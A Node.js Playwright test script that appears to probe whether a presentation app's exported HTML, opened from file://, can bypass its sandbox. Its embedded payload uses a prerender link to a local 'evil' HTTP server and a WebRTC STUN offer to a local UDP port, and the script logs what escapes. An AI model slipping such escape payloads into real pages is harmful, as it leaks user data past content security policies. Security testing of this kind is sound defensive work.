// New-input (a): standalone HTML export opened from file:// — do prerender + webrtc still escape?
const fs=require('node:fs'),path=require('node:path'),http=require('node:http'); const {pathToFileURL}=require('node:url');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const UDP_IP='127.0.0.1',UDP_PORT=4663;
const html=`<!doctype html><html><body><h1>exp</h1><script>
window.__p={};
{const l=document.createElement('link');l.rel='prerender';l.href='http://localhost:4661/ESCAPE-prerender-fileurl?d=1';document.head.append(l);window.__p.prerender='appended';}
try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:${UDP_IP}:${UDP_PORT}'}]});pc.createDataChannel('c');pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>window.__p.webrtc='offer-set').catch(e=>window.__p.webrtc='rej:'+e.name);}catch(e){window.__p.webrtc='throw:'+e.name}
<\/script></body></html>`;
(async()=>{
 const site=await L.startSite(4660);
 const hl=[]; const evil=http.createServer((req,res)=>{hl.push(req.url.slice(0,50));res.writeHead(200);res.end('x');});
 await new Promise(r=>evil.listen(4661,'0.0.0.0',r));
 const udp=await L.startUdp(UDP_PORT);
 const out={}; let browser;
 try{
  browser=await chromium.launch({channel:'chromium'});
  // 1) download the export through the UI
  const ctx=await browser.newContext({acceptDownloads:true}); const page=await ctx.newPage();
  await L.openWorkspace(page,'http://127.0.0.1:4660/');
  await L.openFile(page,L.makePackage(html,{manifest:{title:'Export probe'}}),'exp.zip');
  await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
  const [dl]=await Promise.all([page.waitForEvent('download'),page.locator('[data-pres-html]').click()]);
  const file=path.join(__dirname,'out','export.html'); await dl.saveAs(file);
  out.exportBytes=fs.statSync(file).size;
  out.exportCsp=[...fs.readFileSync(file,'utf8').matchAll(/http-equiv="Content-Security-Policy" content="([^"]*)"/g)].map(m=>m[1].slice(0,120)).slice(0,1);
  await ctx.close();
  // 2) open from file:// and Start
  const ctx2=await browser.newContext(); const p2=await ctx2.newPage();
  await p2.goto(pathToFileURL(file).href);
  out.topOrigin=await p2.evaluate(()=>location.protocol+' origin='+self.origin);
  const before=hl.length, ub=udp.log.length;
  await p2.getByRole('button',{name:'Start presentation',exact:true}).click();
  await L.sleep(4000);
  const frame=await L.until(()=>p2.frames().find(f=>f.url().startsWith('blob:')),'app frame',8000).catch(()=>null);
  out.probes=frame?await frame.evaluate(()=>window.__p).catch(()=>'err'):'no-frame';
  out.status=await p2.locator('#status').textContent().catch(()=>null);
  out.httpReceivedFromFileUrl=hl.slice(before);
  out.stunDatagramsFromFileUrl=udp.log.length-ub;
 } finally { if(browser)await browser.close(); await site.close(); evil.closeAllConnections?.(); await new Promise(r=>evil.close(r)); await udp.close(); fs.writeFileSync(path.join(__dirname,'logs','v-export.json'),JSON.stringify(out,null,2)); }
 console.log(JSON.stringify(out,null,1));
})().catch(e=>{console.error(e);process.exit(1)});
